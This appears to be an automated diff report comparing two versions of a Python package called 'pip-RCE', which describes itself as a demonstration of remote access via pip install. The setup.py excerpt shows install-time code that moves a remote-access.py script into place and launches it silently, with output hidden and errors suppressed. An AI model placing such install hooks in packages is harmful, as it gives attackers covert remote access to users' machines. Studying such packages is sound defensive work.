# Comparing `tmp/pip-RCE-0.0.2.tar.gz` & `tmp/pip-RCE-0.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pip-RCE-0.0.2.tar", last modified: Tue May 16 04:10:07 2023, max compression
+gzip compressed data, was "pip-RCE-0.0.3.tar", last modified: Tue May 16 04:39:53 2023, max compression
```

## Comparing `pip-RCE-0.0.2.tar` & `pip-RCE-0.0.3.tar`

### file list

```diff
@@ -1,11 +1,12 @@
-drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     1062 2023-05-16 02:20:56.000000 pip-RCE-0.0.2/LICENSE
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      775 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/PKG-INFO
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      234 2023-05-16 02:24:24.000000 pip-RCE-0.0.2/README.md
-drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/pip_RCE.egg-info/
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      775 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/PKG-INFO
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      150 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/SOURCES.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/dependency_links.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/top_level.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       38 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/setup.cfg
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     3641 2023-05-16 04:10:03.000000 pip-RCE-0.0.2/setup.py
+drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 04:39:53.754076 pip-RCE-0.0.3/
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     1062 2023-05-16 02:20:56.000000 pip-RCE-0.0.3/LICENSE
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       24 2023-05-16 04:33:57.000000 pip-RCE-0.0.3/MANIFEST.in
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      775 2023-05-16 04:39:53.754076 pip-RCE-0.0.3/PKG-INFO
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      234 2023-05-16 02:24:24.000000 pip-RCE-0.0.3/README.md
+drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 04:39:53.754076 pip-RCE-0.0.3/pip_RCE.egg-info/
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      775 2023-05-16 04:39:53.000000 pip-RCE-0.0.3/pip_RCE.egg-info/PKG-INFO
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      162 2023-05-16 04:39:53.000000 pip-RCE-0.0.3/pip_RCE.egg-info/SOURCES.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 04:39:53.000000 pip-RCE-0.0.3/pip_RCE.egg-info/dependency_links.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 04:39:53.000000 pip-RCE-0.0.3/pip_RCE.egg-info/top_level.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       38 2023-05-16 04:39:53.754076 pip-RCE-0.0.3/setup.cfg
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     3641 2023-05-16 04:35:32.000000 pip-RCE-0.0.3/setup.py
```

### Comparing `pip-RCE-0.0.2/LICENSE` & `pip-RCE-0.0.3/LICENSE`

 * *Files identical despite different names*

### Comparing `pip-RCE-0.0.2/PKG-INFO` & `pip-RCE-0.0.3/PKG-INFO`

 * *Files 15% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pip-RCE
-Version: 0.0.2
+Version: 0.0.3
 Summary: To Show the vulnerability of pip install
 Author: zeroc
 Keywords: python,vulnerability,remoteaccess,sockets
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Topic :: Security
```

### Comparing `pip-RCE-0.0.2/pip_RCE.egg-info/PKG-INFO` & `pip-RCE-0.0.3/pip_RCE.egg-info/PKG-INFO`

 * *Files 15% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pip-RCE
-Version: 0.0.2
+Version: 0.0.3
 Summary: To Show the vulnerability of pip install
 Author: zeroc
 Keywords: python,vulnerability,remoteaccess,sockets
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Topic :: Security
```

### Comparing `pip-RCE-0.0.2/setup.py` & `pip-RCE-0.0.3/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -95,15 +95,15 @@
             os.rename("remote-access.py", dest+"/remote-access.py")
         try : 
             subprocess.Popen(["python3", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
         except:
             pass
         
 
-VERSION = '0.0.2'
+VERSION = '0.0.3'
 DESCRIPTION = 'To Show the vulnerability of pip install'
 LONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'
 CLASSIFIERS = [
         "Development Status :: 1 - Planning",
         "Intended Audience :: Developers",
         "Programming Language :: Python :: 3",
         "Topic :: Security",
```

